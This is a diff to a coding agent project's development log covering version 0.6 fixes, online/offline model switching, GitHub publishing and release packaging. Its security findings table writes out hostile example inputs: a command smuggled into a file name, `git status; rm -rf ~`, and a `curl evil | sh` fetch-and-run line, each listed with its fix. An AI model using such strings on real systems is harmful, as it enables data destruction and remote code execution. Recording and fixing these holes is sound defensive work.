@@ -38,6 +38,7 @@ how each problem was fixed, and what the measurements say. Read it after `00-ove
   history trimming, eval harness, packaging, CI template.
 * **Phase 2.5 (this session)** — got a real model running, ran the evals, fixed what the real model exposed (section 6),
   added GPU offload, added `--trace`.
+* **Phases 3-10** — see sections 5-6g; version 0.6 is Phase 10.
 * **Planned** (see `02-roadmap.md`): parallel tool execution, auto-format on write, patch-style edits, repo map, subagents,
   service mode, containers for running untrusted code.
 
@@ -303,6 +304,118 @@ tested and documented:
 | Docs: the "how it works" story existed in three versions (`00`, `04` Part 7, `05`), install steps in `01` and `04`, "ways to run" in `05` and `06` | `00-overview` is the single explanation (with a traced request and a code reading order); `01` covers only the offline model; `04` and `05` point to `00` and `06` |
 Also: a stray byte-order mark removed from `evals/__init__.py`. 141 tests, lint, types and the docs audit pass.
 
+## 6g. Phase 10 (version 0.6): review everything, fix it, online/offline, ready to ship
+**Your requests (20 Nov 2026):** go through the whole project and collect every feature worth adding; fix the issues it
+has; add switching between the offline and the online model; later a website to download it as a product — but first
+refine the product until it is right in itself, working like Claude Code. Midway you also put the project on GitHub
+and asked for a clean first commit, no threats later, your account shown but **no e-mail leak**, and a private
+repository.
+
+**Method.** All automated checks were green (141 tests, lint, types, docs), so the remaining problems could only be
+found by reading every file and then **proving** each suspicion with a small probe script before changing anything.
+Twenty suspicions were tested; **all twenty reproduced**. After the fixes the same probes were run again: none
+reproduces. (Probe scripts: kept outside the project; each became a unit test in `tests/test_phase10.py`.)
+
+| # | Found (reproduced) | Why it mattered | Fix |
+|---|---|---|---|
+| 1 | A hook `ruff check {file}` with a model-chosen file name `a$(New-Item ... PWNED).txt` **created the file** | the model could run any command on your PC, unasked | `sandbox.quote_for_shell` |
+| 2 | Allow rule `run_shell(git status*)` also allowed `git status; rm -rf ~` | one "always" answer opened every command | `settings.command_parts`: every part must be allowed |
+| 3 | An "always" for `ls *.py` saved a rule matching `ls x; curl evil \| sh; .py` | saved rules acted as wildcards | `settings.escape_pattern` |
+| 4 | One edit of an LF file on Windows rewrote **every line** as CRLF; even a rejected write did | whole-file churn in git | `tools.read_text`/`write_text`, byte rollback |
+| 5 | `edit_file` with an empty `old` and `all=true` turned `abc` into `XaXbXcX` | silent file corruption | refused |
+| 6 | `search` without a glob looked only at `*.py` | in JS/Go/Rust projects it found nothing | all text files, `.gitignore` honoured |
+| 7 | A valid `tsconfig.json` (comments) was **rejected and rolled back** | TypeScript projects could not be configured | JSONC accepted for the right files |
+| 8 | A valid C++ header named `.h` was rejected | C++ projects | C *or* C++ check |
+| 9 | `main.rs` declaring a not-yet-written module was rejected | Rust projects | rustfmt reads the file from its input |
+| 10 | `run_tests` found 0 tests in a plain `tests/` folder (exit code 5) | pytest-style projects | `-s tests`, pytest / npm / go / cargo detection, the project's `.venv` |
+| 11 | `read_file` of a binary file returned thousands of garbage characters | wasted tokens; a 5 GB model could be loaded | refused; big files read in parts |
+| 12 | The history size ignored tool-call arguments (50 KB counted as 3 KB) | 8K local contexts overflowed unnoticed | `llm.message_size`, `fit_history` |
+| 13 | `--resume` after `/reset` brought the cleared conversation back | privacy and context | event lines in the log |
+| 14 | A half-written log line made `--resume` crash | crash-safety promise broken | bad lines skipped |
+| 15 | `/undo` after a question did nothing; `/undo` also erased **your own** later edits | lost work | per-request steps, your edits kept |
+| 16 | A 3-second timeout took 25 s when the program had started a child (forever for a server) | a frozen agent | process groups, `kill_tree` |
+| 17 | Offline: **28 s of retry pauses on every model call**, every time | offline use was unusable | offline detection with a probe and cool-down |
+| 18 | An empty model reply was shown as the answer | blank answers | retried once |
+| 19 | Cut-off tool arguments became "bad arguments: KeyError('path')" | the model hunted the wrong problem | `BAD_ARGUMENTS`, cut-off answers rescued |
+| 20 | `LOCALAGENT_NUM_CTX=8k` crashed with a traceback | first-run experience | one `setup problem` line |
+
+Found while reading, fixed with the rest: the file overview of this very project was 32 DLL names and no code; Windows
+had no time-zone data, so the "new day" for quotas came an hour late in summer; usage counts were written non-atomically
+(a half-written file erased all counts); every HTTP-server session had its own rate limiter (ten sessions = ten times
+the limit); programs could read your keyboard; Python programs printing ✓ into a pipe crashed on Windows; Ollama as a
+Gemini fallback was asked for a 32K window; Gemini-only fields were sent to every server; the non-streaming client
+crashed on an unexpected body; "please fix ..." never counted as a change request; the version was written in three
+places.
+
+**Online / offline, as built.** Three modes (`auto` default, `online`, `offline`), chosen by flag, variable, settings file
+or `/model` in the chat, with the conversation kept across a switch (`Agent.set_backend`). The new `localserver.py` finds
+a running local server or starts llama.cpp itself — GPU layers fitted by llama.cpp's own `--fit`, so no hand-tuning per
+computer — waits for it, fits the conversation into its 8K window, and stops it on exit; on Windows a job object ends it
+even when the terminal window is closed. In `auto`, losing the internet switches to the local model within the same
+call and back when Google is reachable again.
+
+**Verified live (20 Nov 2026):**
+- `--doctor` on this PC: mode auto, Gemini key accepted, `ok local model: Qwen3-8B-Q4_K_M.gguf (5027 MB), started with
+  ...\bin\llamacpp-vulkan\llama-server.exe when needed`.
+- `-p` with Gemini and an attached file: correct answer. First run **2 calls / 4 017 tokens / 14.8 s** (the model read the
+  attached file again); after one sentence in prompt rule 1, **1 call / 2 004 tokens / 5.6 s**.
+- The real `llama-server.exe` started with the agent's exact command line and a missing model: it rejected no argument
+  and failed only on the model; the agent reported the log's last lines and left nothing running. The full
+  start → wait → answer → stop cycle also runs in the tests against a fake server.
+- **The real offline model, end to end** (once 6.8 GB of memory was free):
+  - *Auto mode, internet "gone"* (Gemini's address made unresolvable, quota counts sent to a scratch file): Gemini was
+    marked unreachable at once (no retry waits), llama.cpp started with Qwen3-8B by itself, loaded in about 20 s, and
+    answered correctly ("adds 1 ... incorrect") — 2 calls, 50 s of model time, 70 s in all; then it was stopped.
+  - *`localagent --offline -p ...` from the command line:* it answered correctly, but **revealed a bug**: the test file had
+    been written by PowerShell with a byte-order mark, which the Python check took for a syntax error (see `verify.md`,
+    `_compile_stage`). The local model then spent 9 calls and 191 s on a file that was fine. Fixed (compile the raw
+    bytes; let an edit that names the mark remove it; ruff's "cannot read this encoding" is not a code error) and run
+    again: **4 calls, 88 s, correct answer, no false failure, the file untouched.** Both times no `llama-server` process
+    was left afterwards.
+- Bad variable → `setup problem: LOCALAGENT_NUM_CTX must be a whole number such as 8192 (it is '8k')`, exit code 2.
+
+**Putting it on GitHub safely.** Your first commit (made before this session's changes) could not have been pushed and
+should not have been: it contained the **5 GB model** (GitHub refuses files over 100 MB — after uploading everything),
+105 llama.cpp binaries, conversation logs, `__pycache__` and `egg-info` build files, no `.gitignore`, and your personal
+Gmail address as author and committer of a **public** repository. Nothing had reached GitHub (the remote was empty).
+What was done, with your agreement at each step:
+1. `.gitignore` (models, binaries, logs, environments, caches, `.env`, keys) and `.gitattributes` (consistent line
+   endings); the excluded files were removed from the commit but **kept on disk**. 261 tracked files became 112.
+2. A scan of every tracked text file for API keys, tokens, private keys, e-mail addresses and personal paths: none.
+3. The commit rewritten with a descriptive message, the author changed to GitHub's private address
+   `<id>+Aditya-Singh-Chandel@users.noreply.github.com` (set for this repository only) — the commit still shows your
+   account; afterwards no object in the repository mentions a Gmail address.
+4. The old objects purged: `.git` went from **727 MB to 437 KB**; the largest object left is a 142 KB docs page.
+5. The repository made **private** (at your choice). GitHub's free secret scanning only covers public repositories,
+   which is one more reason for step 6.
+6. The commit guard (`tools/check_commit.py`, enabled with `git config core.hooksPath .githooks`): refuses files over
+   20 MB, model/key/`.env` files, secret-looking text and a public author address. Tested both ways.
+7. CI: the workflow's token limited to reading, and a Windows job added.
+A restore point of the pre-session source was also zipped to `..\localagent-v0.5.0-backup.zip`.
+
+**Numbers.** Tests 141 → **201** (60 new, all passing; 2 skipped as before), ruff and mypy clean, docs audit **35 pages**
+(two new: `localserver.md`, `check_commit.md`).
+
+## 6h. Phase 11: a license, the real offline model, and a product to download
+**Your requests:** "make the necessary license", the memory is now free for checking the local model, refine the
+product as much as possible, and work on the next step (making it downloadable, before the website).
+
+| # | Done | Why / evidence |
+|---|---|---|
+| 1 | MIT license, third-party notices (llama.cpp, LLVM OpenMP, Qwen3, ruff, mypy, embeddable Python), license metadata | the most common license for developer tools; a bundle that carries other people's programs must carry their licenses |
+| 2 | The real offline model tested end to end, and a byte-order-mark bug fixed | see section 6g: 9 calls → 4 calls, no false failure |
+| 3 | `localagent setup` and `localagent models` | a downloaded product must set itself up; checked live on this PC (everything found, nothing downloaded) |
+| 4 | `fetch.py`: verified, resumable downloads | Hugging Face's CDN answered a Range request with 206 and the right bytes (GGUF signature), so a 5 GB download continues after a break |
+| 5 | The download sources checked before writing the code | python.org offers embeddable zips only for bug-fix releases (3.12.16 and 3.13.18 were source-only), so the bundle uses 3.14.10; llama.cpp's "latest" release was a placeholder (`v1.0.0`) and the builds are `b12588` and similar; Linux and macOS builds are `.tar.gz`, Windows ones `.zip` |
+| 6 | The portable Windows zip and the wheel (`tools/build_release.py`) | 35.7 MB, built in 88 s; unzipped into an empty folder it worked without any installed Python: `--version`, ruff 0.17.6 and mypy 2.4.1 found, broken code rejected (F821), `--doctor` correct, a real request answered in 1 call / 9.7 s |
+| 7 | Messages say "run: localagent setup" instead of naming a docs file | the bundle's doctor told users to "see docs/01-setup-and-models.md", which a download does not contain |
+| 8 | `CHANGELOG.md`, `SECURITY.md`, `CONTRIBUTING.md`; CI adds Python 3.14 | the files people look for on a project page; 3.14 is the bundled Python |
+
+**Git.** The 0.6 work and the license are two commits on the branch `release-0.6` (the guard passed both); this phase
+adds a third. Pushing to GitHub was **blocked by Claude Code's safety system** (sending data to an outside service needs
+your own action), so the push is yours: `git push -u origin main` and `git push -u origin release-0.6`, then open a pull
+request (or `gh pr create`).
+
 ## 7. Errors met and how each was fixed
 | Symptom | Cause | Fix |
 |---|---|---|
@@ -322,6 +435,11 @@ Also: a stray byte-order mark removed from `evals/__init__.py`. 141 tests, lint,
 | The "do nothing" eval test ran out of scripted replies | the nudge now asks the model a second time | test supplies two replies and expects 2 calls |
 | `add_method` looped 18 identical edits | greedy decoding + no loop detection | repeat guard (section 6b item 7) |
 | Python heredoc scripts wrote real newlines into string literals (twice) | `\n` was converted before Python saw it | repaired with a script that builds the escape from `chr(92)`, and later wrote helper scripts to files instead |
+| (0.6) A long Markdown section appended with a shell heredoc failed: "unexpected EOF while looking for matching quote" | the shell tool mangles some quote characters in heredocs | wrote the section to a file with an editor tool and appended it with Python |
+| (0.6) mypy: "Cannot infer type of lambda" in the commit guard | a `lambda name=name: ...` default-argument closure | `functools.partial(git, "show", ...)` |
+| (0.6) mypy: a variable used first as a list, then as a number, in `context._overview` | one name reused for two meanings | renamed the second (`needed`) |
+| (0.6) After the history-fitting change, the compaction test returned the summary as the answer | the test used a 1 000-token window, smaller than the system prompt itself, so trimming dropped the older turns before compaction could run | the test now uses a realistic 3 000-token window; the behaviour is correct |
+| (0.6) A live `@file` request still read the attached file (2 calls) | nothing told the model attached files were current | one sentence in prompt rule 1: 1 call, half the tokens |
 
 ## 8. How to reproduce everything (commands)
 ```
@@ -334,7 +452,13 @@ Also: a stray byte-order mark removed from `evals/__init__.py`. 141 tests, lint,
 ```
 
 ## 9. Status and honest limits
-* 136 unit tests pass (real Docker, a fake MCP server, a local web server, every installed language checker); ruff and mypy clean; docs audit passes (every code line documented exactly once).
+* **Now (version 0.6, 20 Nov 2026):** 216 unit tests pass (real Docker when running, a fake MCP server, fake model and
+  llama.cpp servers, local web servers, every installed language checker); ruff and mypy clean; docs audit passes (35
+  pages, every code line documented exactly once). The local model was run for real through the new automatic start,
+  in auto and offline mode (section 6g). Not yet measured on 0.6: the full eval suite. The CI workflow (Linux +
+  Windows) runs on the first push.
+* The bullets below are the history of earlier versions, kept as they were written.
+* (0.5) 136 unit tests passed; ruff and mypy clean; docs audit passed.
 * **Final eval on the real model (Qwen3-8B, 9 GPU layers, temperature 0): 4/4 tasks passed** -
   fizzbuzz 2 calls/88 s, fix_bug 5 calls/82 s, add_method 4 calls/76 s, word_count 2 calls/85 s (about 3-8k tokens each).
   Earlier runs: 2/4, then 3/4 (see section 6). Four tasks is a small sample and an 8B model is not perfectly
@@ -348,5 +472,6 @@ Also: a stray byte-order mark removed from `evals/__init__.py`. 141 tests, lint,
   only the evals measure *model quality*, and an 8B local model is much weaker than Claude.
 * Speed: ≈4.7 generated tokens/s at best on this PC. A single task takes 1–3 minutes. That is why the agent is built
   around saving tokens and calls.
-* `run_python` runs code with your user permissions; containers are on the roadmap for untrusted work.
-* The CI workflow file is an untested template.
+* Without Docker, `run_python` runs code with your user permissions (after your approval); with `--sandbox docker` it
+  runs in the locked-down container (built in Phase 5).
+* (until 0.6) The CI workflow file was an untested template; 0.6 added a Windows job and read-only permissions.
